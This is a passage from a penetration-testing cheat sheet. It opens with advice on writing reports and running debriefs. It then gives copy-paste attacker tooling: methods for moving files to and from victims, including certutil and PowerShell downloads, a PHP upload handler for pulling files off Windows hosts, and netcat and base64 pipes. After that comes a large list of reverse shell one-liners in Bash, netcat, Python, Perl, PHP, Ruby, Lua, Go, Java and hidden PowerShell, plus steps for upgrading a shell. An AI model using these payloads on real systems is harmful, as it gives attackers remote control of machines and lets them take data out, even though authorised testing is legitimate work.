  • Reproducible walkthrough from initial access to confirmed exploitation.
  • Screenshots or video as visual evidence.
  • Code samples formatted for readability and easy copy-paste.
  • Write for a stranger — every step explicit enough for someone who has never seen the application.
  • State preconditions up front (required credentials, network access, prior steps).
  • Include expected vs. actual behavior so developers understand what correct behavior looks like.
  • Sanitize before delivery — replace real passwords, hashes, and sensitive data with placeholders.
  • Pin exact tool versions and full command flags used.
  • Label any PoC step that modifies data, creates accounts, or causes denial of service.

19.6 Compliance Reporting (Optional)

When the engagement has a compliance angle, map findings explicitly to the relevant standard so the client can demonstrate remediation to auditors.

  • Align findings with PCI DSS, GDPR, NIST, ISO 27001, or whichever standard applies.
  • Only map to a framework control when the relationship is direct and unambiguous.
  • Reference exact control IDs (e.g., NIST SP 800-53 AC-2, ISO 27001 A.9.4.2).
  • Phrase remediation recommendations in the framework's language where possible.
  • State explicitly that passing findings does not constitute full compliance certification if the engagement covered only a subset of the environment.
  • Include a compliance summary table — finding, control violated, remediation status (Open / In Progress / Closed).

19.7 Common Mistakes to Avoid

  • Vague findings — every finding needs a description, impact statement, and risk level.
  • Lack of context — relate findings to the business environment so the reader understands real-world risk.
  • Overloading executive sections with jargon — save deep technical detail for the appendix.
  • Copy-pasting raw scanner output — interpret and summarize it; strip false positives before including it.
  • Rating everything Critical or High — severity inflation makes triage impossible; justify every rating.
  • Missing the "so what" — chain impact to a business consequence, not just the first technical step.
  • Inconsistent finding names — consolidate the same issue across multiple endpoints into one finding with all affected locations listed.
  • No timeline or appendix — their absence raises questions about the rigor of the engagement.
  • Skipping a spell-check pass — errors signal carelessness and cause clients to question the testing itself.
  • Omitting false-positive acknowledgement — a brief note explaining why a flagged item was ruled out demonstrates thoroughness.

19.8 Structure for Each Vulnerability

Each vulnerability entry should be self-contained — a reader should be able to understand the issue, reproduce it, and remediate without reading anything else in the report.

  1. Title — brief, descriptive, and impact-aware (e.g., "SQL Injection in Login Form").
  2. Severity Rating — Critical / High / Medium / Low, optionally with a CVSS score.
  3. Affected Component — exact location (URL, API endpoint, module) and environment.
  4. Description — short non-technical overview, followed by the technical root cause.
  5. Impact — business consequences (data loss, outage, regulatory breach) and technical implications.
  6. Proof of Concept (PoC) — step-by-step reproduction guide with all inputs, requests, and commands; screenshots or video; relevant code or request/response payloads.
  7. Exploitation Risks — ease of exploitation (authenticated vs. unauthenticated, tooling required) and likelihood in the wild.
  8. Remediation Recommendations — specific, actionable fix instructions with links to OWASP or vendor documentation.
  9. Affected Versions/Systems (optional) — software or system versions known to be affected.
  10. Additional Notes (optional) — special trigger conditions and any temporary mitigations.
  11. Compliance Impact (optional) — relevant standards and how exploitation affects regulatory standing.

The following table shows how CVSS v3.1 base score bands translate into severity labels, what that severity means in practical terms, and a representative example of a vulnerability in each band:

Severity Rating CVSS v3.1 Score Band Practical Meaning Example Vulnerability
Critical 9.0 – 10.0 Remotely exploitable with no authentication required, yields full system compromise or mass data exfiltration; patch or mitigate immediately — often within 24–48 hours per most security policies. Unauthenticated Remote Code Execution (e.g., Log4Shell CVE-2021-44228); SQL injection granting OS command execution on a production database server.
High 7.0 – 8.9 Significant impact on confidentiality, integrity, or availability; may require low-privilege authentication or adjacent network access; remediate within a defined sprint or patch cycle (typically 7–30 days). Stored XSS leading to session hijacking for all authenticated users; privilege escalation from standard user to local administrator via unquoted service path.
Medium 4.0 – 6.9 Moderate impact or requires significant preconditions (user interaction, authenticated access, or chaining) to be exploitable; plan remediation within a regular patch window (typically 30–90 days). Reflected XSS requiring a victim to click a crafted link; insecure direct object reference allowing a user to read another user's non-sensitive profile data.
Low 0.1 – 3.9 Minimal impact in isolation; often requires multiple preconditions, physical access, or extensive user interaction; address in routine maintenance cycles (typically 90–180 days) or accept as residual risk with documented justification. Verbose error messages disclosing framework version; missing HttpOnly flag on a non-session cookie; clickjacking on a public, read-only marketing page.
Informational / None 0.0 No direct exploitability; represents a best-practice gap or defense-in-depth weakness — include it but do not assign a severity color. Missing security headers (CSP, HSTS) on internal admin panel; use of a deprecated but not yet vulnerable library version; default HTTP server banner disclosure.

19.9 Tips for Debrief Sessions

The debrief is where findings become decisions — ensure stakeholders understand each vulnerability, its risk, and the path to remediation.

  1. Know your audience — focus on business risk for non-technical stakeholders; go into technical detail for security engineers.
  2. Start with the Executive Summary — open with overall posture and critical risks before details; highlight improvements since the last assessment.
  3. Explain impact clearly — describe real-world consequences using examples; cover reputational risk, regulatory exposure, and the path to further compromise.
  4. Walk through findings in risk order (Critical first); call out quick wins that reduce exposure immediately.
  5. Provide actionable remediation steps with OWASP guides, vendor patches, or reference material for the technical team.
  6. Invite questions throughout; use live PoC demonstrations where practical.
  7. Frame the session as a shared effort to strengthen security posture, not a list of failures.
  8. Close with a concrete plan: patching timeline, retest scheduling, security policy review.
  9. Be prepared for resistance — back findings with data and be ready to discuss alternative solutions.
  10. Take notes and distribute a post-debrief summary capturing decisions, owners, and agreed next steps.
  11. Use slides, network diagrams, and screenshots to communicate complex concepts quickly.
  • Rehearse critical findings — practice explaining each in under two minutes.
  • Prepare a risk heat map (likelihood vs. impact) to communicate the overall landscape faster than prose.
  • Keep raw evidence (tool output, logs) available on request but do not lead with it.
  • Agree on retest scope before the session ends — confirm which findings will be retested and when.
  • Clarify the report's distribution list and format (PDF only, no editable copies).
  • Send a post-debrief summary within 24 hours with decisions, next steps, and deadlines.
  • Distinguish findings the client can fix immediately from those requiring vendor patches.

20. File Transfers

Transfer Method Direction OS When to Use Pitfalls / OPSEC
RDP Shared Folder (xfreerdp / rdesktop) Bidirectional (drag-and-drop in GUI) Windows target, Linux attacker Already have RDP creds and a GUI session; easiest for bulk or interactive transfers Drive redirection can be disabled by GPO; visible in Windows Explorer and Event Logs; requires port 3389 open
Impacket (psexec / wmiexec / evil-winrm) Bidirectional (lget / lput / download / upload) Windows target, Linux attacker Already have an active shell over SMB/WMI; no new listener needed lput writes to disk — triggers AV; stage to %TEMP% and obfuscate filenames
FTP Bidirectional (upload / download) Cross-platform FTP server already present, or can be stood up; useful for bulk moves with progress feedback Credentials plaintext; active mode fails through NAT — always use passive; must set binary mode or executables corrupt
SMB (impacket-smbserver) Bidirectional after drive map Windows target, Linux attacker Victim is Windows and outbound TCP 445 to Kali is allowed; fast for large binaries Outbound 445 often blocked by corporate firewalls; unauthenticated shares rejected on modern Windows — always add credentials
HTTP (python3 -m http.server) Pull only — victim downloads from Kali Windows target (PowerShell / certutil), Linux target (wget / curl) Outbound HTTP from victim is allowed; most universally applicable pull method; no extra software required on Windows File lands on disk — AV scans it; rename payloads; Python logs all requests (useful for confirmation)
PHP Upload Script (Apache) Push only — victim uploads to Kali Windows victim, Linux/Apache attacker Need to exfiltrate from victim to Kali and only HTTP outbound is available; reverse of the HTTP pull path Apache must be running and reachable; /var/www/uploads/ must be writable; stop Apache after transfer to close the endpoint
Netcat (nc / ncat) Bidirectional (either end can listen or send) Cross-platform (Linux preferred; Windows needs nc.exe) No shared protocol available; fast ad-hoc transfers between Linux hosts; can also compress via tar pipe No integrity check — always verify with md5sum; non-standard ports may alert firewall/IDS; unencrypted by default
Base64 encode/decode Any direction — text paste or Netcat stream Cross-platform No direct network path; only text paste available (web shell, limited shell, clipboard-only RDP) ~33% size overhead — impractical above a few MB; terminal line-wrap can corrupt; strip newlines with tr -d '\n' before decoding

20.1 RDP Shared Folder

Mount a local directory as a shared drive over RDP so files can be dragged across without a separate channel.

xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[ip] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop

rdesktop -z -P -x m -u [user] -p [password] [ip] -r disk:test=/home/[your_username]/Desktop

20.2 Impacket Tools

Impacket shells tunnel file I/O over the same protocol connection already in use — no new port needed.

  • PsExec / WmiExec: use lget to download from the victim and lput to upload from Kali.
  • Evil-WinRM: use download [file_name] [optional_destination] and upload [file_name] [optional_destination].

20.3 FTP

Always switch to binary mode first — ASCII mode corrupts non-text files.

# Switch to binary mode inside an ftp session - prevents file corruption
binary

20.4 SMB

Spin up a temporary authenticated SMB share on Kali, then map it as a network drive from the Windows victim.

# Kali - host an authenticated SMB share
impacket-smbserver [share_name] . -smb2support -username my_user -password my_password
# Windows victim - map the Kali SMB share as a network drive
net use m: \\[kali_ip]\[share_name] /user:my_user my_password

20.5 HTTP Requests

Serve files from Kali with Python's built-in HTTP server and pull them down on Windows using PowerShell or certutil.

# Kali - serve files over HTTP on port 80
python3 -m http.server 80
# Download via WebClient
(New-Object System.Net.WebClient).DownloadFile('http://[kali_ip]/[file]', '[output_path]')

# Download via Invoke-WebRequest
Invoke-WebRequest -Uri http://[kali_ip]/[file] -OutFile [output_file]

# Download via certutil (LOLBin fallback)
certutil -urlcache -split -f http://[kali_ip]/[file]

# Download from cmd.exe
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_ip]/[file]', '[output_path]')"

20.6 PHP Script (Bring Files from Windows)

Deploy a minimal PHP upload handler on Kali's Apache so Windows can push files to the attacker via a PowerShell one-liner.

<?php
  $uploaddir = '/var/www/uploads/';

  $uploadfile = $uploaddir . $_FILES['file']['name'];

  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
# Kali setup - deploy upload.php and create the uploads directory
chmod +x upload.php
sudo mkdir /var/www/uploads
mv upload.php /var/www/uploads

# Start Apache
service apache2 start
ps -ef | grep apache
# Windows victim - push a file to the Kali PHP upload endpoint
powershell (New-Object System.Net.WebClient).UploadFile('http://[kali_ip]/upload.php', '[file_to_transfer]')
# Kali teardown - stop Apache after transfer
service apache2 stop

20.7 Netcat

Use raw Netcat pipes to push files between any two hosts; receiver must start listening before the sender connects.

# Receiver - write incoming data to disk
nc -lvp 4444 > received_file.txt
# Receiver (encrypted)
ncat --ssl -lvp 4444 > received_file.txt
# Sender - push a file to the receiver
nc [receiver_ip] 4444 < file_to_send.txt
# Sender (encrypted)
ncat --ssl [receiver_ip] 4444 < file_to_send.txt
# Receiver - decompress incoming tarball stream on the fly
nc -lvp 4444 | tar xzvf -
# Sender - compress and stream a file or folder
tar czvf - file_or_folder | nc [receiver_ip] 4444

20.8 Using Base64 Contents

Encode a file as Base64 text to move it across channels that only support copy-paste or plain-text streams.

# Sender - print the Base64 string; copy from terminal output
base64 file_to_send.txt
# Receiver - paste the copied string and decode back to a file
echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
# Receiver - receive Base64-encoded data and decode to file via Netcat
nc -lvp 4444 | base64 -d > received_file.txt
# Sender - encode a file as Base64 and stream it via Netcat
base64 file_to_send.txt | nc [receiver_ip] 4444

21. Utilities

21.1 Reverse Shells

Ready-to-use reverse shell payloads across multiple languages — substitute <TARGET_IP> and <TARGET_PORT> before firing. When a firewall blocks arbitrary high ports, try 80, 443, or 53.

Language / Method When to Use Key Dependency Encrypted Option
Bash /dev/tcp Linux target, /bin/bash present, outbound TCP allowed bash (not dash/sh) No — wrap with socat OPENSSL
Netcat (-e flag) Quick shell when full-featured nc is installed nc with -e support (e.g., ncat/openbsd-netcat) ncat --ssl
Netcat FIFO nc installed but -e flag absent (Debian/Ubuntu default nc) nc, mkfifo No
PowerShell Windows target with no extra binaries PowerShell v2+ (powershell.exe) Use HTTPS C2 or ssh tunnel
Python Linux/Mac target with Python installed; good pty upgrade path python or python3 Wrap socket with ssl.wrap_socket
PHP RCE via web shell, LFI-to-code, or PHP-CLI on target php CLI binary No native; combine with stunnel
Perl Older Linux/Unix with Perl but no Python perl, Socket module No
Ruby Ruby on Rails servers or targets with Ruby runtime ruby, socket stdlib No
Golang Go runtime on target, or pre-staged Go binary in restricted env go runtime Compile with crypto/tls
Java Java app server (Tomcat, Jenkins), JVM present JRE / java binary SSLSocket in source
Socat Need encrypted shell, full PTY, or bidirectional pipe socat binary Yes — OPENSSL-LISTEN / OPENSSL
Lua Embedded Lua runtime (nginx, Redis scripting, game servers) lua + socket library No
Telnet FIFO nc absent but telnet present (rare legacy systems) telnet, mknod No 
# Bash — /dev/tcp
/bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
# CMD — download nc.exe first
certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
.\nc.exe [attacker_ip] [port] -e cmd.exe
.\\nc.exe [attacker_ip] [port] -e cmd.exe
# Netcat — with -e flag
nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash
# Netcat — FIFO (no -e flag)
mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f
echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
# Lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"
# Perl
perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# PHP
php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# Ruby
ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
# Socat
socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
# Telnet FIFO
rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
// Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TARGET_IP>/<TARGET_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
# PowerShell — full interactive stream
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

# PowerShell — simpler PS> prompt
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
# Shellerator — generated payloads
git clone https://github.com/ShutdownRepo/shellerator
pip3 install --user -r requirements.txt
sudo cp shellrator.py /bin/shellrator
shellrator

21.2 Upgrade Shells

Upgrade a dumb TCP shell to a fully interactive TTY — required for tab-completion, job control, and tools that need a controlling terminal (sudo, ssh, vi).

Step Where (Attacker / Victim) Command Purpose
1 Victim python3 -c 'import pty; pty.spawn("/bin/bash")' Spawn a PTY on the remote end
2 Attacker Ctrl-Z Background the netcat process
3 Attacker stty raw -echo; fg Disable local echo/processing, bring nc back to foreground
4 Victim export TERM=xterm-256color Enable colour and full terminal control sequences
5 Attacker (read) stty size Get local terminal dimensions to copy to remote
6 Victim stty rows <R> columns <C> Match remote terminal size so vim/less render correctly 
# Background, fix echo, foreground
Ctrl-Z
stty raw -echo
fg
export SHELL=bash
export TERM=xterm          # or xterm-256color
stty rows <ROWS> columns <COLS>
# Bash / sh spawn
bash -i
sh -i
# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
-- Lua
os.execute('/bin/bash')
# Perl
perl -e 'exec "/bin/bash"'
# Ruby
exec "/bin/bash"
